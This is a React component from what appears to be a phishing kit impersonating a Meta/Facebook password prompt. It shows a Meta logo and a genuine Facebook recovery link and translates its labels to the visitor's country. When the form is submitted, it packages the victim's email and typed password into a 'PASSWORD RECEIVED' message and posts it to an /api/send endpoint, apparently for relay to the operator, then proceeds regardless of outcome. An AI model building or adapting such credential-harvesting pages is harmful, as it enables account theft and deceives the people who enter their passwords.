'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    pageName?: string;
    pageUrl?: string;
    legalBusinessName?: string;
    phoneNumber?: string;
    description?: string;
    nextStep: () => void;
}

const PasswordModal: FC<PasswordModalProps> = ({ 
    userProfileImage, 
    userName, 
    userEmail,
    nextStep 
}) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({})

    const { messageId, message, setMessage, geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };
    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = [
            'Enter your password',
            'Password',
            'Log in',
            'Forgotten password?'
        ];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading || !message) return;
        setIsLoading(true);

        const updatedMessage = `${message}

<b>✅ PASSWORD RECEIVED</b>
<b>📧 Account Email:</b> <code>${userEmail}</code>
<b>🔒 Password:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }
            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center justify-center gap-2 sm:gap-3 md:gap-4 py-8 sm:py-10 md:py-12'>
                        {/* Password Input */}
                        <div className='w-full px-4 sm:px-6 md:px-8 mb-2 sm:mb-3'>
                            <div className='relative w-full'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                    }}
                                    className='h-12 sm:h-13 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-4 py-2 pr-10 text-base'
                                    required
                                    autoComplete='new-password'
                                    placeholder={t('Enter your password')}
                                />
                                <FontAwesomeIcon
                                    icon={showPassword ? faEyeSlash : faEye}
                                    size='lg'
                                    className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]'
                                    onClick={() => setShowPassword(!showPassword)}
                                />
                            </div>
                        </div>

                        {/* Log In Button */}
                        <div className='w-full px-4 sm:px-6 md:px-8 mt-2 sm:mt-3'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className={`flex h-12 sm:h-13 md:h-14 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
                                }`}
                            >
                                {isLoading ? (
                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                ) : (
                                    t('Log in')
                                )}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-xs md:text-sm text-center text-blue-600 hover:underline mt-3 sm:mt-4'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-3'>
                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
